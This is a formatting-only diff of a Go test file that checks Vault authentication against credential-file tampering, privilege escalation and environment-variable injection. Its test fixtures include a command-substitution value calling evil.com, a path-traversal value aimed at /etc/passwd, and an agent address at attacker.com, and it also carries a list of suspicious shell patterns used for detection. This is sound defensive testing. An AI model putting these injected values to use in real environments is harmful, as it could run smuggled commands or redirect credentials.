@@ -92,9 +92,9 @@ func TestCredentialFileBypassPrevention(t *testing.T) {
 
 		// Create corrupted credential files
 		corruptedContents := [][]byte{
-			{0x00, 0xFF, 0xFE, 0xBF}, // Binary data
-			[]byte("partial-cre"),        // Truncated
-			[]byte("credential\x00null"), // Null bytes
+			{0x00, 0xFF, 0xFE, 0xBF},           // Binary data
+			[]byte("partial-cre"),              // Truncated
+			[]byte("credential\x00null"),       // Null bytes
 			[]byte(strings.Repeat("A", 10000)), // Extremely long
 		}
 
@@ -167,7 +167,7 @@ func TestAuthenticationFallbackSecurityEnhanced(t *testing.T) {
 		// Most secure methods should be tried first
 
 		methods := GetAuthenticationMethods()
-		
+
 		// Vault agent token should be first (most secure)
 		if len(methods) > 0 && !strings.Contains(methods[0].Name, "vault-agent") {
 			t.Errorf("Vault agent token should be first authentication method, got: %s", methods[0].Name)
@@ -224,7 +224,7 @@ func TestPrivilegeEscalationPrevention(t *testing.T) {
 	t.Run("root_token_access_restriction", func(t *testing.T) {
 		// Test that root token access is properly restricted
 		originalUser := os.Getenv("USER")
-		
+
 		// Test with non-root user
 		os.Setenv("USER", "testuser")
 		defer func() {
@@ -262,12 +262,12 @@ func TestPrivilegeEscalationPrevention(t *testing.T) {
 	t.Run("environment_variable_injection_prevention", func(t *testing.T) {
 		// Test that environment variables cannot be used to bypass authentication
 		maliciousEnvVars := map[string]string{
-			"VAULT_TOKEN":        "hvs.malicious_token",
-			"VAULT_ROLE_ID":      "../../../etc/passwd",
-			"VAULT_SECRET_ID":    "$(curl evil.com)",
-			"VAULT_AGENT_ADDR":   "http://attacker.com:8200",
-			"VAULT_CACERT":       "/dev/null",
-			"HOME":               "/tmp/fake_home",
+			"VAULT_TOKEN":      "hvs.malicious_token",
+			"VAULT_ROLE_ID":    "../../../etc/passwd",
+			"VAULT_SECRET_ID":  "$(curl evil.com)",
+			"VAULT_AGENT_ADDR": "http://attacker.com:8200",
+			"VAULT_CACERT":     "/dev/null",
+			"HOME":             "/tmp/fake_home",
 		}
 
 		// Save original values
@@ -347,18 +347,18 @@ func isValidUUID(s string) bool {
 	if len(s) != 36 {
 		return false
 	}
-	
+
 	// Basic UUID format: 8-4-4-4-12
 	parts := strings.Split(s, "-")
 	if len(parts) != 5 {
 		return false
 	}
-	
-	if len(parts[0]) != 8 || len(parts[1]) != 4 || len(parts[2]) != 4 || 
-	   len(parts[3]) != 4 || len(parts[4]) != 12 {
+
+	if len(parts[0]) != 8 || len(parts[1]) != 4 || len(parts[2]) != 4 ||
+		len(parts[3]) != 4 || len(parts[4]) != 12 {
 		return false
 	}
-	
+
 	// Check that all parts are hex
 	for _, part := range parts {
 		for _, r := range part {
@@ -367,7 +367,7 @@ func isValidUUID(s string) bool {
 			}
 		}
 	}
-	
+
 	return true
 }
 
@@ -382,16 +382,16 @@ func isValidVaultToken(s string) bool {
 			break
 		}
 	}
-	
+
 	if !hasValidPrefix {
 		return false
 	}
-	
+
 	// Must be reasonable length
 	if len(s) < 10 || len(s) > 200 {
 		return false
 	}
-	
+
 	return true
 }
 
@@ -436,7 +436,7 @@ func ValidateAuthenticationEnvironment() error {
 	// Check for suspicious environment variable values
 	suspiciousPatterns := []string{
 		"../",
-		"$(", 
+		"$(",
 		"`",
 		"|",
 		";",
@@ -448,7 +448,7 @@ func ValidateAuthenticationEnvironment() error {
 
 	envVars := []string{
 		"VAULT_TOKEN",
-		"VAULT_ROLE_ID", 
+		"VAULT_ROLE_ID",
 		"VAULT_SECRET_ID",
 		"VAULT_AGENT_ADDR",
 		"VAULT_CACERT",
